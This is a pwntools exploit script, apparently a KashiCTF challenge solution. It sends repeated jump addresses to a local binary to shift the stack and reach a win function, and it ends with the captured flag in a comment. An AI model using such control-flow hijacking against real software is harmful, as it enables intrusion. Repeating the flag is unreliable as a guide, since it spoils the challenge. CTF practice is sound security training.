from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall', '''
    b *0x401293
    continue
''')

# p = remote('kashictf.iitbhucybersec.in', 21857)

# 1. jump to the appropriate place in main function
# continuously reduce rsp by 0x10 (move up by 2) to meet the requirement of fgets in win function
p.sendline(b'0x401273')
p.sendline(b'0x401273')
p.sendline(b'0x401273')
p.sendline(b'0x401273')
p.sendline(b'0x401273')
# 2. jump to the appropriate place in win function
# the requirement of fgets in win function is met now
p.sendline(b'0x4011ba')

p.interactive()

# KashiCTF{m4r10_15_fun_w17H_C_d9daTrwD}